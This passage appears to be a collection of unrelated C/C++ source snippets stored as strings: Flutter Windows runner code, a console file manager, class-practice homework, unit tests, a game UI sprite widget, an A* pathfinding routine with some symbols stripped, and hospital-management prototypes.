vector_to_string(vector<string>& words)\n{\n\tstring output;\n\n\tfor (string s : words) {\n\t\toutput += s + \" \";\n\t}\n\n\treturn output;\n\n}\n\nvoid fill_least_entropy_position(vector<string>& words, std::map<std::string, WordSet>& rule_set, std:",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <cstdio>\r\n#include <cstring>\r\n#include <windows.h>\r\n#include <direct.h>\r\n\r\nusing namespace std;\r\n\r\n// function to create a new file\r\nvoid create_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to create: \";\r\n    getline(cin, file_name);\r\n    ofstream file(file_name.c_str());\r\n    file.close();\r\n    cout << \"File '\" << file_name << \"' created successfully!\\n\";\r\n}\r\n\r\n// function to read the contents of a file\r\nvoid read_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to read: \";\r\n    getline(cin, file_name);\r\n    ifstream file(file_name.c_str());\r\n    if (file.is_open()) {\r\n        cout << \"Contents of file '\" << file_name << \"':\\n\";\r\n        string line;\r\n        while (getline(file, line)) {\r\n            cout << line << endl;\r\n        }\r\n        file.close();\r\n    } else {\r\n        cout << \"Unable to open file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to write to a file\r\nvoid write_file() {\r\n    string file_name, content;\r\n    cout << \"Enter the name of the file to update: \";\r\n    getline(cin, file_name);\r\n    cout << \"Enter the content to add: \";\r\n    getline(cin, content);\r\n    ofstream file(file_name.c_str(), ios::app);\r\n    if (file.is_open()) {\r\n        file << content << endl;\r\n        file.close();\r\n        cout << \"File '\" << file_name << \"' updated successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to open file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to delete a file\r\nvoid delete_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to delete: \";\r\n    getline(cin, file_name);\r\n    if (remove(file_name.c_str()) == 0) {\r\n        cout << \"File '\" << file_name << \"' deleted successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to delete file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to check if a file exists\r\nbool file_exists(const char* file_name) {\r\n    DWORD file_attr = GetFileAttributesA(file_name);\r\n    return (file_attr != INVALID_FILE_ATTRIBUTES && !(file_attr & FILE_ATTRIBUTE_DIRECTORY));\r\n}\r\n\r\n// function to rename a file\r\nvoid rename_file() {\r\n    string old_name, new_name;\r\n    cout << \"Enter the name of the file to rename: \";\r\n    getline(cin, old_name);\r\n    cout << \"Enter the new name for the file: \";\r\n    getline(cin, new_name);\r\n    if (rename(old_name.c_str(), new_name.c_str()) == 0) {\r\n        cout << \"File '\" << old_name << \"' renamed to '\" << new_name << \"' successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to rename file '\" << old_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to create a new directory\r\nvoid create_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to create: \";\r\n    getline(cin, directory_name);\r\n    if (_mkdir(directory_name.c_str()) == 0) {\r\n        cout << \"Directory '\" << directory_name << \"' created successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to create directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to delete a directory\r\nvoid delete_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to delete: \";\r\n    getline(cin, directory_name);\r\n    if (_rmdir(directory_name.c_str()) == 0) {\r\n        cout << \"Directory '\" << directory_name << \"' deleted successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to delete directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to list all files in a directory\r\nvoid list_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to list: \";\r\n    getline(cin, directory_name);\r\n    WIN32_FIND_DATAA find_data;\r\n    HANDLE handle = FindFirstFileA((directory_name + \"/*\").c_str(), &find_data);\r\n    if (handle != INVALID_HANDLE_VALUE) {\r\n        cout << \"Files in directory '\" << directory_name << \"':\\n\";\r\n        do {\r\n            if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {\r\n                cout << find_data.cFileName << endl;\r\n            }\r\n        } while (FindNextFileA(handle, &find_data));\r\n        FindClose(handle);\r\n    } else {\r\n        cout << \"Unable to open directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// main function\r\nint main() {\r\n    int choice;\r\n    do {\r\n        cout << \"File Management System Menu:\\n\";\r\n        cout << \"1. Create a new file\\n\";\r\n        cout << \"2. Read the contents of a file\\n\";\r\n        cout << \"3. Write to a file\\n\";\r\n        cout << \"4. Delete a file\\n\";\r\n        cout << \"5. Rename a file\\n\";\r\n        cout << \"6. Create a new directory\\n\";\r\n        cout << \"7. Delete a directory\\n\";\r\n        cout << \"8. List all files in a directory\\n\";\r\n        cout << \"9. Exit\\n\";\r\n        cout << \"Enter your choice (1-9): \";\r\n        cin >> choice;\r\n        cin.ignore();\r\n        switch (choice) {\r\n            case 1:\r\n                create_file();\r\n                break;\r\n            case 2:\r\n                read_file();\r\n                break;\r\n            case 3:\r\n           ",
    "\ufeff// Homework01.04.2024-Classes.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\nusing namespace std;\n\nclass Dog \n{\npublic:\n    string name;\n    string color;\n    string bread;\n    string favorite_food;\n    double weight = 0;\n\n    void Bark()\n    {\n        cout << bread << name << \" : \" <<  \"GAV-GAV...\\n\";\n    }\n    void Growl()\n    {\n        cout << bread << name << \" : \" << \"R-R-R-R-R-R...\\n\";\n    }\n    void Walk()\n    {\n        cout << \" loves to walk in the park,\";\n    }\n    void Eat()\n    {\n        cout << bread << name << \" love eat \" << favorite_food << \".\\n\";\n    }\n    void Sleep()\n    {\n        cout <<  bread << name << \" went to sleep.\\n\";\n    }\n};\n\nclass PowerBank\n{\npublic:\n    string brand;\n    string color;\n    int quantity_ports = 0;\n    double capacity = 0;\n    bool Type_C = false;\n    bool USB = false;\n    bool Micro_USB = false;\n    bool charg = false;\n\n    void Charging()\n    {\n        if ((Type_C || Micro_USB) && !USB && charg)\n        {\n            cout << \"Power bank charge the device.\\n\";\n        }\n        else if (USB)\n        {\n            cout << \"Power bank charging.\\n\";\n        }\n    }\n    void  PowerBankInfo()\n    {\n        cout << \"Power Bank Info:\\n\";\n        cout << \"\\t\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\t\\tColor: \" << color << \"\\n\";\n        cout << \"\\t\\tQuantity USB-ports: \" << quantity_ports << \"\\n\";\n        cout << \"\\t\\tCapacity: \" << capacity << \" mA/h\\n\";\n        if (Type_C)\n        {\n            cout << \"\\t\\tHave Type C-port \\n\";\n        }\n        if (Micro_USB)\n        {\n            cout << \"\\t\\tHave Micro USB-port \\n\";\n        }\n    }\n};\n\nclass Mouse\n{\npublic:\n    string brand;\n    string model;\n    string color;\n    bool wireless = false;\n    bool left_button = false;\n    bool right_button = false;\n    bool scrol = false;\n\n    void Press_left_button()\n    {\n        if (left_button)\n        {\n            cout << \"Perform an action.\\n\";\n        }\n        \n    }\n    void Press_right_button()\n    {\n        if (right_button)\n        {\n            cout << \"Show context menu.\\n\";\n        }\n    }\n    void Scrol()\n    {\n        if (scrol)\n        {\n            cout << \"Scroll....scrol...scrol...scrol...\\n\";\n        }\n    }\n    void MouseInfo()\n    {\n        cout << \"Mouse Info:\\n\";\n        cout << \"\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\tModel: \" << model << \"\\n\";\n        cout << \"\\tColor: \" << color << \"\\n\";\n        if (wireless)\n        {\n            cout << \"\\tWired or wireless:  wireless.\\n\";\n        }\n        else\n        {\n            cout << \"\\tWired or wireless:  wired.\\n\";\n        }\n    }\n};\n\nclass TV\n{\npublic:\n    string brand;\n    string model;\n    double diagonal = 0;\n    string color;\n\n    void TVInfo() \n    {\n        cout << \"TV Info:\\n\";\n        cout << \"\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\tModel: \" << model << \"\\n\";\n        cout << \"\\tDiagonal: \" << diagonal << \" inches\" << \"\\n\";\n        cout << \"\\tColor: \" << color << \"\\n\";\n    }\n    void TV_On() \n    {\n        cout << \"The TV turns on...\\n\";\n    }\n\n    void TV_Off() \n    {\n        cout << \"The TV turns off\\n\";\n    }\n\n    void changeChannel(int channel) \n    {\n        cout << \"Changing channel to \" << channel << \"\\n\";\n    }\n\n};\n\nclass Automobile\n{\npublic: \n    string brand;\n    string model;\n    string equipment;\n    string engine_type;\n    double engine_volume = 0;\n    string fuel;\n    string transmision;\n    double power = 0;\n    int wheel_drive = 0;\n\n    void CarInfo()\n    {\n        cout << \"Car Information:\\n\";\n        cout << \"\\t\\tCar brand: \" << brand << \"\\n\";\n        cout << \"\\t\\tModel: \" << model << \"\\n\";\n        cout << \"\\t\\tCar equipment: \" << equipment << \"\\n\";\n        cout << \"\\t\\tEngine type: \" << engine_type << \"\\n\";\n        cout << \"\\t\\tEngine volume: \" << engine_volume << \" sm3\\n\";\n        cout << \"\\t\\tFuel: \" << fuel << \"\\n\";\n        cout << \"\\t\\tTransmision: \" << transmision << \"\\n\";\n        cout << \"\\t\\tEngine power: \" << power << \" hp\\n\";\n        cout << \"\\t\\tWheel drive: \" << wheel_drive << \" wheels\\n\";\n    }\n\n};\n\nclass Sosed\n{\npublic:\n    string name;\n    string shoes;\n    string tool;\n    bool sleeping = false;\n    string mental_condition;\n\n    void Never_sleep()\n    {\n        cout << \"A-HA-HA!!! NO, NO, NO\\n\";\n    }\n    void About_myself()\n    {\n        cout << \"My name is \" << name << \", i am a \" << mental_condition << \" And i have a \" << tool << \"\\n\";\n    }\n    void Work()\n    {\n        cout << \"I'll put my on now \" << shoes << \" and take my \" << tool << \"\\n\";\n        cout << \"I urgently need to do something. NOW!\\n\";\n    }\n};\n\nint main()\n{\n  //////////////////////////////////////////////////////////////////////////                  DOG                    ///////////////////////////////////////////////////////////////// \n    Dog dog;\n\n    dog.name = \"Benya\";\n    dog.favorite_food = \"meat\";\n    dog.bread = \"Pikines \";\n    dog.weight = 6;\n    dog.color = \"beige\";\n    \n    cout << dog.name",
    "/**\n * @file SolverUnitTests.cpp\n *\n * @brief SolverUnitTests test class for providing test methods for Solver project.\n *\n * @author Hovsep Papoyan\n * Contact: papoyanhovsep93@gmail.com\n * @Date 2024-03-28\n *\n */\n\n#include \"CppUnitTest.h\"\n#include \"../Solver/InputValidator.h\"\n#include \"../Solver/Solver.h\"\n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\nnamespace SolverUnitTests\n{\n\tTEST_CLASS(SolverUnitTests)\n\t{\n\tpublic:\n\t\tTEST_METHOD(InputValidatorTests)\n\t\t{\n\t\t\tstd::optional<std::vector<int>> res1{ std::nullopt };\n\n\t\t\t// Testing of argc (negative).\n\t\t\tconst char* const argv1[]{ \"ProgramName\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv1) / sizeof(argv1[0]), argv1), L\"InputValidatorTest1\");\n\n\t\t\tconst char* const argv2[]{ \"ProgramName\", \"1\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv2) / sizeof(argv2[0]), argv2), L\"InputValidatorTest2\");\n\n\t\t\tconst char* const argv3[]{ \"ProgramName\", \"1\", \"2\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv3) / sizeof(argv3[0]), argv3), L\"InputValidatorTest3\");\n\n\t\t\tconst char* const argv4[]{ \"ProgramName\", \"1\", \"2\", \"3\", \"4\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv4) / sizeof(argv4[0]), argv4), L\"InputValidatorTest4\");\n\n\t\t\t// Testing of argv (negative).\n\t\t\tconst char* const argv5[]{ \"ProgramName\", \"1\", \"2\", \"3.4\"};\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv5) / sizeof(argv5[0]), argv5), L\"InputValidatorTest5\");\n\n\t\t\tconst char* const argv6[]{ \"ProgramName\", \"1\", \"2\", \".\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv6) / sizeof(argv6[0]), argv6), L\"InputValidatorTest6\");\n\n\t\t\tconst char* const argv7[]{ \"ProgramName\", \"-1\", \"0\", \"1-\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv7) / sizeof(argv7[0]), argv7), L\"InputValidatorTest7\");\n\n\t\t\tconst char* const argv8[]{ \"ProgramName\", \"1\", \"2\", \"-0\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv8) / sizeof(argv8[0]), argv8), L\"InputValidatorTest8\");\n\n\t\t\tconst char* const argv9[]{ \"ProgramName\", \"1\", \"2\", \"000\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv9) / sizeof(argv9[0]), argv9), L\"InputValidatorTest9\");\n\n\t\t\tconst char* const argv10[]{ \"ProgramName\", \"+5\", \"-6\", \"-7\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv10) / sizeof(argv10[0]), argv10), L\"InputValidatorTest10\");\n\n\t\t\tconst char* const argv11[]{ \"ProgramName\", \"1\", \"2\", \"a\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv11) / sizeof(argv11[0]), argv11), L\"InputValidatorTest11\");\n\n\t\t\tconst char* const argv12[]{ \"ProgramName\", \"1\", \"2\", \"aaaaa\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv12) / sizeof(argv12[0]), argv12), L\"InputValidatorTest12\");\n\n\t\t\tconst char* const argv13[]{ \"ProgramName\", \"1\", \"2\", \"0x01\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv13) / sizeof(argv13[0]), argv13), L\"InputValidatorTest13\");\n\n\t\t\tconst char* const argv14[]{ \"ProgramName\", \"1\", \"2\", \"0234\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv14) / sizeof(argv14[0]), argv14), L\"InputValidatorTest14\");\n\n\t\t\tconst char* const argv15[]{ \"ProgramName\", \"1a\", \"2\", \"3\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv15) / sizeof(argv15[0]), argv15), L\"InputValidatorTest15\");\n\n\t\t\tconst char* const argv16[]{ \"ProgramName\", \"77777777777777\", \"1\", \"2\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv16) / sizeof(argv16[0]), argv16), L\"InputValidatorTest16\");\n\n\t\t\t// Testing of argc and argv (positive)\n\t\t\tres1 = { 1,2,3 };\n\t\t\tconst char* const argv17[]{ \"ProgramName\", \"1\", \"2\", \"3\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv17) / sizeof(argv17[0]), argv17), L\"InputValidatorTest17\");\n\t\t\t\n\t\t\tres1 = { 1,2,3,4,5,6 };\n\t\t\tconst char* const argv18[]{ \"ProgramName\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv18) / sizeof(argv18[0]), argv18), L\"InputValidatorTest18\");\n\n\t\t\tres1 = { 1,2,0 };\n\t\t\tconst char* const argv19[]{ \"ProgramName\", \"1\", \"2\", \"0\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv19) / sizeof(argv19[0]), argv19), L\"InputValidatorTest19\");\n\n\t\t\tres1 = { 1,0,2 };\n\t\t\tconst char* const argv20[]{ \"ProgramName\", \"1\", \"0\", \"2\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv20) / sizeof(argv20[0]), argv20), L\"InputValidatorTest20\");\n\n\t\t\tres1 = { 1,0,0 };\n\t\t\tconst char* const argv21[]{ \"ProgramName\", \"1\", \"0\", \"0\" };\n\t\t\tAssert::IsTrue(res1 == InputValidator::getValidatedInput(sizeof(argv21) / sizeof(argv21[0]), argv21), L\"InputValidatorTest21\");\n\t\t}\n\t\tTEST_METHOD(SolverLinearTests)\n\t\t{\n\t\t\tusing namespace slv;\n\n\t\t\tSolver::Result res1 = -1.0;\n\t\t\tSolver::Result res2 = Solver::solve(0.0, 1.0, 1.0);\n\t\t\tAssert::Is",
    "/*\n * Copyright (c) 2010-2022 OTClient <https://github.com/edubart/otclient>\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#include \"uisprite.h\"\n#include <client/spritemanager.h>\n#include <framework/graphics/texturemanager.h>\n\n#include \"framework/graphics/drawpool.h\"\n#include \"framework/graphics/drawpoolmanager.h\"\n\nvoid UISprite::drawSelf(DrawPoolType drawPane)\n{\n    if (drawPane != DrawPoolType::FOREGROUND)\n        return;\n\n    // draw style components in order\n    if (m_backgroundColor.aF() > Fw::MIN_ALPHA) {\n        Rect backgroundDestRect = m_rect;\n        backgroundDestRect.expand(-m_borderWidth.top, -m_borderWidth.right, -m_borderWidth.bottom, -m_borderWidth.left);\n        drawBackground(m_rect);\n    }\n\n    drawImage(m_rect);\n\n    if (m_spriteVisible && m_sprite) {\n        g_drawPool.addTexturedRect(getPaddingRect(), m_sprite, m_spriteColor);\n    }\n\n    drawBorder(m_rect);\n    drawIcon(m_rect);\n    drawText(m_rect);\n}\n\nvoid UISprite::setSpriteId(int id)\n{\n    if (!g_sprites.isLoaded())\n        return;\n\n    m_spriteId = id;\n    if (id == 0) {\n        m_sprite = nullptr;\n        return;\n    }\n\n    const auto& image = g_sprites.getSpriteImage(id);\n    m_sprite = image ? std::make_shared<Texture>(image) : nullptr;\n}\n\nvoid UISprite::onStyleApply(const std::string_view styleName, const OTMLNodePtr& styleNode)\n{\n    UIWidget::onStyleApply(styleName, styleNode);\n\n    for (const auto& node : styleNode->children()) {\n        if (node->tag() == \"sprite-id\")\n            setSpriteId(node->value<int>());\n        else if (node->tag() == \"sprite-visible\")\n            setSpriteVisible(node->value<bool>());\n        else if (node->tag() == \"sprite-color\")\n            setSpriteColor(node->value<Color>());\n    }\n}",
    "void ALevelGeneratorCalculatePath()\r\n{\r\n    UE_LOG(LogTemp, Warning, TEXT(Starting A Path Calculation));\r\n\r\n    EnsureCurrentNodeForShips();\r\n\r\n     Define a lambda for comparing nodes in the priority queue by their F value (G + H)\r\n    auto CompareNodes = [](GridNode a, GridNode b) { return a-F  b-F; };\r\n\r\n    for (AShip Ship  Ships)\r\n    {\r\n    \tstdpriority_queueGridNode, stdvectorGridNode, decltype(CompareNodes) queue(CompareNodes);\r\n    \tResetAllNodes();\r\n         Reset distances, parent pointers, and heuristic values for all nodes\r\n        for (int y = 0; y  MAX_MAP_SIZE; y++)\r\n        {\r\n            for (int x = 0; x  MAX_MAP_SIZE; x++)\r\n            {\r\n                GridNode node = WorldArray[y][x];\r\n                if (node)\r\n                {\r\n                    node-G = 100000;  Initially high G value\r\n                    node-H = CalculateHeuristic(node, Ship-GoalNode);  Manhattan distance as heuristic\r\n                    node-F = node-G + node-H;\r\n                    node-Parent = nullptr;\r\n                }\r\n            }\r\n        }\r\n\r\n        GridNode startNode = Ship-CurrentNode;\r\n        startNode-G = 0;\r\n        startNode-F = startNode-G + startNode-H;\r\n        queue.push(startNode);\r\n\r\n        while (!queue.empty())\r\n        {\r\n            GridNode current = queue.top();\r\n            queue.pop();\r\n        \tSearchCount++;\r\n\r\n            if (current == Ship-GoalNode) break;\r\n\r\n            TArrayGridNode neighbors = GetNeighbors(current);\r\n\r\n            for (GridNode neighbor  neighbors)\r\n            {\r\n                float tentativeG = current-G + neighbor-GetTravelCost();\r\n                float tentativeF = tentativeG + neighbor-H;  F = G + H\r\n\r\n                if (tentativeF  neighbor-F)\r\n                {\r\n                    neighbor-Parent = current;\r\n                    neighbor-G = tentativeG;\r\n                    neighbor-F = tentativeF;\r\n\r\n                     A node may be added to the queue multiple times with different F values;\r\n                     we only care about the smallest one.\r\n                    queue.push(neighbor);\r\n                }\r\n            }\r\n        }\r\n    \t\r\n        RenderPath(Ship);  Visualize the path\r\n    }\r\n\r\n    UE_LOG(LogTemp, Warning, TEXT(Finished A Path Calculation));\r\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include<fstream>\r\n#include <string>\r\n#include <conio.h>\r\n#include <windows.h>\r\n#include <ctime>\r\n#include<cctype>\r\n#include<limits>\r\nusing namespace std;\r\n//functions prototype starts\r\nvoid topheading();\r\nvoid header();\r\nvoid delay(int milliseconds);\r\nvoid showLoadingAnimation();\r\nvoid gotoxy(int x, int y);\r\nvoid multaninterface();\r\nvoid islamabadinterface();\r\nvoid lahoreinterface();\r\nstring login();\r\nvoid thankyou();\r\nvoid clear();\r\nvoid hideCursor();\r\nstring adminmenu();\r\nint check_integer(string num);\r\nvoid prescription();\r\nvoid addpatient(int &addpatientindex, string patientname[], string patientage[], string patientcnic[], string patientbloodgroup[], string patienthistory[], string visitdatepatient[], string patientphonenumber[], string filenameaddpatient);\r\nvoid dischargepatient(string dischargepatientcnic, int addpatientindex, string patientcnic[], string patientname[], string patientage[], string patientbloodgroup[], string patienthistory[], string patientphonenumber[], string visitdatepatient[], string filenameaddpatient);\r\nvoid viewpatient(int &addpatientindex, string patientname[], string patientage[], string patientcnic[], string patientbloodgroup[], string patienthistory[], string visibledatepatient[], string patientphonenumber[]);\r\nvoid changingsalary(string doctorsalary, string managersalary, string filenamecahngingsalary);\r\nvoid profitloss(string patientcharges, int addpatientindex, string filenameprofitloss);\r\nvoid addbed(string bedadd, string filenameaddbed);\r\nvoid adddoctor(string doctorname[], string doctorspeciality[], int &adddoctorindex, string filenameadddoctor);\r\nvoid viewdoctor(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid changeequipmentmanager(int &managercheck, string &equipmentmanagername, string &equipmentmanagergender, string &equipmentmanagercnic, string filenameaddequipmentmanager);\r\nvoid addequipmentmanager(string equipmentmanagername, string equipmentmanagergender, string equipmentmanagercnic, int &managercheck, string filenameaddequipmentmanager);\r\nvoid updatepatient(string updatepatientcnic, string patientcnic[], int &addpatientindex, string patientname[], string patientage[], string patientbloodgroup[], string patienthistory[], string visitdatepatient[], string patientphonenumber[], string filenameaddpatient);\r\nstring pateintmenu();\r\nvoid doctorschedule(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid viewdoctorslist(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid selectdoctor(string selectdoctorname, string selectdoctorspeciality, int &adddoctorindex, string doctorname[], string doctorspeciality[], string hire[]);\r\nvoid availablebeds(string bedadd, int &addpatientindex);\r\nvoid billinginvoice(string servicetype[], int &addbillingindex, string daysstayes[], string roomtype[]);\r\nvoid reviewhearth();\r\nvoid bilslip(string servicetype[], string daysstayes[], string roomtype[], int &addbillingindex);\r\nstring viewprescription();\r\nvoid patientreview(string review[], int &addpatientindex);\r\nstring pharmacymenu();\r\nvoid addmedicineform(string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], int &addmedicineindex, string filenameaddmedicine);\r\nvoid viewmedicineform(string buymedicinequantity, int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], string filenameaddmedicine);\r\nvoid updatemedicineform(string updatemedicinebatchnumber, string medicinebatchnumber[], int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string filenameaddmedicine);\r\nstring doctormenu();\r\nvoid buymedicines(string buymedicinequantity, string purchasemedicines, int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], string filenamebuymedicines);\r\nbool charactermCheck(string characterCheck);\r\nvoid expiredmedicine(int addmedicineindex, string currentdate[], string medicineexpirydate[], string medicinename[]);\r\nbool recursionCheck(string check, string recursion[], int size);\r\nbool checkenter(string check);\r\nbool gendercheck(string check);\r\nbool digitscheck(string digits);\r\nbool checkshiftin(string check[]);\r\nvoid addmanager(string managername, string managercnic);\r\nvoid medicineindemand();\r\nint convertDatetodays(string date); \r\nbool isExpired(string currentDate, string expiryDate);\r\nvoid removemedicine(string updatemedicinebatchnumber, int &addmedicineindex, string medicinebatchnumber[], string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string filenameaddmedicine);\r\nvoid addemploy(string employname[], int &addemployindex, string employcnic[], string employphonenumbe",
